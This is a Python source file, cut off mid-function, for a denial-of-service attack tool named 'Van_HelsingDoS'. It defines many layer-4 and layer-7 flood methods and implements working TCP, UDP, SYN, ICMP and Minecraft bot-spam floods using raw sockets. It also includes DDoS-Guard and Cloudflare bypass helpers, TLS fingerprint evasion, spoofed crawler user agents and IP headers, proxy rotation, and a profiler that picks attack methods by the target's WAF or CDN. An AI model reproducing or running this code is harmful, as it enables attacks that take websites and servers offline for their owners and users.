#!/usr/bin/env python3

import sys
import os
import subprocess

# [PRE-FLIGHT CHECK]
try:
    import httpx
    import cloudscraper
    import PyRoxy
except ImportError:
    print('Missing dependencies. Redirecting to auto-installer...')
    subprocess.check_call([sys.executable, 'install.py'])
    sys.exit(1)

import asyncio
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
import httpx
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

# [OPTIMIZED] Ulimit (File Descriptor) Booster for Linux/Kali
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    # Try escalating progressively: 1M -> 500K -> 100K -> hard limit
    for target_fd in [1000000, 500000, 100000, hard]:
        try:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target_fd, target_fd))
            break
        except (ValueError, OSError):
            continue
except ImportError:
    pass  # Windows doesn't have resource module

# [OPTIMIZED] uvloop — C-based event loop for Linux (2-4x faster than default)
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    uvloop_status = True
except ImportError:
    uvloop_status = False



from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
try:
    from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode

# [V6] Optional TLS Fingerprint Evasion
try:
    import tls_client
    HAS_TLS_CLIENT = True
except ImportError:
    HAS_TLS_CLIENT = False

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("Van_HelsingDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
# Enforce only TLSv1.2+
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
else:
    # Fallback for older Python versions
    if hasattr(ssl, "OP_NO_TLSv1"):
        ctx.options |= ssl.OP_NO_TLSv1
    if hasattr(ssl, "OP_NO_TLSv1_1"):
        ctx.options |= ssl.OP_NO_TLSv1_1
# [OPTIMIZED] Browser-Like Ciphers (Chrome 120+)
ctx.set_ciphers(
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
    "DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384"
)

__version__: str = "6.0 VAN HELSING"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
tor2webs = [
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
            'onion.link',
            'onion.ws',
            'onion.pet',
            'onion.rip',
            'onion.plus',
            'onion.top',
            'onion.si',
            'onion.ly',
            'onion.my',
            'onion.sh',
            'onion.lu',
            'onion.casa',
            'onion.com.de',
            'onion.foundation',
            'onion.rodeo',
            'onion.lat',
            'tor2web.org',
            'tor2web.fi',
            'tor2web.blutmagie.de',
            'tor2web.to',
            'tor2web.io',
            'tor2web.in',
            'tor2web.it',
            'tor2web.xyz',
            'tor2web.su',
            'darknet.to',
            's1.tor-gateways.de',
            's2.tor-gateways.de',
            's3.tor-gateways.de',
            's4.tor-gateways.de',
            's5.tor-gateways.de'
        ]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]

# [V8] Global CF Clearance Token from turnstile_dispenser
GLOBAL_CF_CLEARANCE = None
cf_path = __dir__ / "files" / "cf_clearance.txt"
if cf_path.exists():
    GLOBAL_CF_CLEARANCE = cf_path.read_text().strip()


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
        "WP_SEARCH", "XMLRPC_AMP", "POST_DYN", "H2_FLOOD", "CHAOS"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    # ---------------- Google ----------------
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",

    # ---------------- Bing / Microsoft ----------------
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",

    # ---------------- Yahoo ----------------
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",

    # ---------------- Yandex ----------------
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    
    # ---------------- Baidu ----------------
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",

    # ---------------- DuckDuckGo ----------------
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",

    # ---------------- Applebot ----------------
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
    "+http://www.apple.com/go/applebot)",

    # ---------------- Facebook / Social ----------------
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",

    # ---------------- Twitter ----------------
    "Twitterbot/1.0",

    # ---------------- LinkedIn ----------------
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",

    # ---------------- Pinterest ----------------
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",

    # ---------------- Other Major Bots ----------------
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",


    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
]




class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
TOTAL_REQUESTS_SENT = Counter()
CONNECTIONS_SENT = Counter()
ERROR_COUNT = Counter()  # [V6] Structured Error Tracking
LAST_ERROR = ""  # [V6] Last error message for display
BURNED_PROXIES = {} # [PHASE 11] Temporal Blacklist: Proxy -> BurnTimestamp
COOLING_PERIOD = 300 # [PHASE 11] 5 Minutes cooldown for blocked proxies
RECYCLE_EVENT = Event()
IS_RECYCLING = False
PROXY_ALIVE_COUNT = Counter()  # [V6] Live proxy counter for health display


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')
    
    @staticmethod
    def get_random_indo_ip():
        # [NEW] Generate Indonesian Residential IPs (Telkomsel, Indihome, XL)
        ranges = [
            "114.124.{}.{}", "182.253.{}.{}", # Telkomsel
            "180.244.{}.{}", "125.160.{}.{}", # Indihome
            "112.215.{}.{}", # XL
            "139.192.{}.{}" # More Indihome
        ]
        chosen = randchoice(ranges)
        return chosen.format(randint(0, 255), randint(1, 254))
    
    @staticmethod
    def crawl(url_str):
        # [NEW] Active Reconnaissance - Scrape for Real Paths
        try:
            from urllib.parse import urlparse
            import urllib.request
            import re
            
            p = urlparse(url_str)
            base = f"{p.scheme}://{p.netloc}"
            
            # Simple GET request
            req = urllib.request.Request(url_str, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                html = response.read().decode('utf-8', errors='ignore')
                
            # Regex to find hrefs
            links = re.findall(r'href=["\'](/?.*?)["\']', html)
            valid_paths = set() 
            for link in links:
                # [STRICT] Strictly exclude absolute URLs or links with domain markers
                if link.startswith('http') or '://' in link or '//' in link:
                    if p.netloc in link: # Still internal? Extract relative
                        try:
                            found_p = urlparse(link)
                            if found_p.path:
                                valid_paths.add(found_p.path)
                        except: pass
                elif link.startswith('/') and len(link) > 1:
                    # Clean fragments and queries for the core path list
                    clean_path = link.split('#')[0].split('?')[0]
                    if clean_path and clean_path.startswith('/') and '.' not in clean_path.split('/')[-1]:
                         valid_paths.add(clean_path)
            
            # [PHASE 6] Heavy Path Prioritization
            heavy_keywords = ['search', 'login', 'checkout', 'cart', 'account', 'register', 'wp-admin', '?s=']
            heavy_paths = [path for path in valid_paths if any(k in path.lower() for k in heavy_keywords)]
            
            return list(valid_paths | set(heavy_paths))
        except Exception:
            return []

    @staticmethod
    def human_format(num: int, ending: str = "B") -> str:
        num = float('{:.3g}'.format(num))
        magnitude = 0
        while abs(num) >= 1024:
            magnitude += 1
            num /= 1024.0
        return '{}{}{}'.format('{:f}'.format(num).rstrip('0').rstrip('.'),
                               ['', 'K', 'M', 'G', 'T', 'P'][magnitude], ending)

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT, TOTAL_REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        TOTAL_REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT, TOTAL_REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        TOTAL_REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()

    @staticmethod
    def track_error(e: Exception):
        """[V6] Structured error tracking instead of silent pass"""
        global ERROR_COUNT, LAST_ERROR
        ERROR_COUNT += 1
        LAST_ERROR = str(e)[:80]


# [V8] Target Profiler — Auto-detect WAF/CDN/Server stack and suggest best methods
class TargetProfiler:
    """Probes target and returns a profile dict with server, waf, and recommended methods."""
    
    CDN_HEADERS = {
        'cf-ray': 'Cloudflare', 'cf-cache-status': 'Cloudflare',
        'x-cdn': 'CDN', 'x-cache': 'CDN/Varnish',
        'x-akamai-transformed': 'Akamai', 'x-sucuri-id': 'Sucuri',
        'x-powered-by-plesk': 'Plesk', 'server-timing': 'CDN',
    }
    
    WAF_SIGNATURES = {
        'cloudflare': 'Cloudflare',
        'ddos-guard': 'DDoS-Guard',
        'sucuri': 'Sucuri',
        'akamai': 'Akamai',
        'incapsula': 'Imperva/Incapsula',
        'stackpath': 'StackPath',
        'aws': 'AWS WAF/CloudFront',
        'fastly': 'Fastly',
    }
    
    METHOD_MAP = {
        'Cloudflare':           ['CFB', 'CFBUAM', 'H2_FLOOD', 'SLOW_V2', 'BYPASS'],
        'DDoS-Guard':           ['DGB', 'H2_FLOOD', 'SLOW_V2', 'POST_DYN'],
        'Akamai':               ['H2_FLOOD', 'SLOW_V2', 'POST_DYN', 'STRESS'],
        'Imperva/Incapsula':    ['H2_FLOOD', 'BYPASS', 'SLOW_V2', 'POST_DYN'],
        'AWS WAF/CloudFront':   ['H2_FLOOD', 'POST_DYN', 'STRESS', 'XMLRPC_AMP'],
        'Sucuri':               ['BYPASS', 'H2_FLOOD', 'POST_DYN'],
        'nginx':                ['SLOW_V2', 'STRESS', 'POST_DYN', 'GET', 'XMLRPC_AMP'],
        'apache':               ['APACHE', 'SLOW', 'SLOW_V2', 'XMLRPC_AMP', 'STRESS'],
        'iis':                  ['STRESS', 'GET', 'POST_DYN', 'H2_FLOOD'],
        'litespeed':            ['POST_DYN', 'STRESS', 'XMLRPC_AMP', 'H2_FLOOD'],
        'unknown':              ['GET', 'STRESS', 'POST_DYN', 'H2_FLOOD'],
    }
    
    @staticmethod
    def profile(url_str: str) -> dict:
        """Probe target and return profile with server, waf, recommendations."""
        result = {'server': 'unknown', 'waf': None, 'cms': None, 'methods': [], 'headers': {}}
        
        try:
            resp = get(url_str, timeout=8, verify=False, allow_redirects=True,
                       headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
            result['headers'] = dict(resp.headers)
            body = resp.text[:5000].lower()
            
            # Detect Server
            server = headers.get('server', '')
            if 'nginx' in server: result['server'] = 'nginx'
            elif 'apache' in server: result['server'] = 'apache'
            elif 'litespeed' in server: result['server'] = 'litespeed'
            elif 'microsoft-iis' in server: result['server'] = 'iis'
            elif 'cloudflare' in server: result['server'] = 'cloudflare'
            
            # Detect WAF/CDN
            for hdr, waf_name in TargetProfiler.CDN_HEADERS.items():
                if hdr in headers:
                    result['waf'] = waf_name
                    break
            
            if not result['waf']:
                for sig, waf_name in TargetProfiler.WAF_SIGNATURES.items():
                    if sig in server or sig in str(headers) or sig in body:
                        result['waf'] = waf_name
                        break
            
            # Detect CMS
            if 'wp-content' in body or 'wordpress' in body:
                result['cms'] = 'WordPress'
            elif 'joomla' in body:
                result['cms'] = 'Joomla'
            elif 'drupal' in body:
                result['cms'] = 'Drupal'
            
            # Build recommendations
            key = result['waf'] or result['server'] or 'unknown'
            result['methods'] = TargetProfiler.METHOD_MAP.get(key, TargetProfiler.METHOD_MAP['unknown'])
            
            # CMS-specific additions
            if result['cms'] == 'WordPress':
                if 'XMLRPC_AMP' not in result['methods']:
                    result['methods'].insert(0, 'XMLRPC_AMP')
                if 'WP_SEARCH' not in result['methods']:
                    result['methods'].insert(1, 'WP_SEARCH')
                    
        except Exception as e:
            result['methods'] = TargetProfiler.METHOD_MAP['unknown']
        
        return result


# [V6] Proxy Health Checker — Background thread that periodically validates proxies
class ProxyHealthChecker(Thread):
    def __init__(self, proxies_list: list, interval: int = 60, timeout: float = 3.0):
        Thread.__init__(self, daemon=True)
        self._proxies = proxies_list
        self._interval = interval
        self._timeout = timeout

    def run(self):
        global PROXY_ALIVE_COUNT
        while True:
            sleep(self._interval)
            if not self._proxies:
                continue
            
            # Sample check: test 10% of proxies (min 5, max 50)
            sample_size = max(5, min(50, len(self._proxies) // 10))
            sample = [randchoice(self._proxies) for _ in range(sample_size)]
            alive = 0
            
            for p in sample:
                try:
                    s = socket(AF_INET, SOCK_STREAM)
                    s.settimeout(self._timeout)
                    p_str = str(p)
                    if ":" in p_str:
                        parts = p_str.replace("//", "").split(":")
                        host = parts[-2].split("@")[-1]
                        port = int(parts[-1])
                        s.connect((host, port))
                        alive += 1
                    s.close()
                except Exception:
                    pass
            
            # Extrapolate from sample
            if sample_size > 0:
                alive_ratio = alive / sample_size
                estimated_alive = int(alive_ratio * len(self._proxies))
                PROXY_ALIVE_COUNT.set(estimated_alive)
                
                if alive_ratio < 0.1:
                    logger.warning(f"{bcolors.FAIL}[HEALTH] Proxy pool critical! Only ~{estimated_alive} alive. Triggering recycle...{bcolors.RESET}")
                    RECYCLE_EVENT.set()


# [V6] Stealth Client — TLS fingerprint evasion using tls_client library
class StealthClient:
    """Wrapper that uses tls_client for Chrome-identical JA3 fingerprint"""
    
    @staticmethod
    def create_session(proxy_url: str = None):
        if HAS_TLS_CLIENT:
            session = tls_client.Session(
                client_identifier="chrome_120",
                random_tls_extension_order=True
            )
            if proxy_url:
                session.proxies = {
                    "http": proxy_url,
                    "https": proxy_url
                }
            return session
        else:
            # Fallback to requests Session
            s = Session()
            if proxy_url:
                s.proxies = {"http": proxy_url, "https": proxy_url}
            s.verify = False
            return s

    @staticmethod
    def stealth_get(url: str, proxy_url: str = None, timeout: int = 5):
        """Single stealth GET request with Chrome JA3 fingerprint"""
        global REQUESTS_SENT, BYTES_SEND
        session = StealthClient.create_session(proxy_url)
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Priority": "u=0, i",
                "Upgrade-Insecure-Requests": "1",
            }
            if HAS_TLS_CLIENT:
                resp = session.get(url, headers=headers, timeout_seconds=timeout)
            else:
                resp = session.get(url, headers=headers, timeout=timeout, verify=False)
            REQUESTS_SENT += 1
            BYTES_SEND += len(url) + 500  # Approximate
            return resp
        except Exception as e:
            Tools.track_error(e)
            return None
        finally:
            if not HAS_TLS_CLIENT and hasattr(session, 'close'):
                session.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP, 
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxy_cycle:
            s = next(self._proxy_cycle).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def OVHUDP(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while True:
                for payload in self._generate_ovhudp():
                    Tools.sendto(s, payload, self._target)
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None

        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
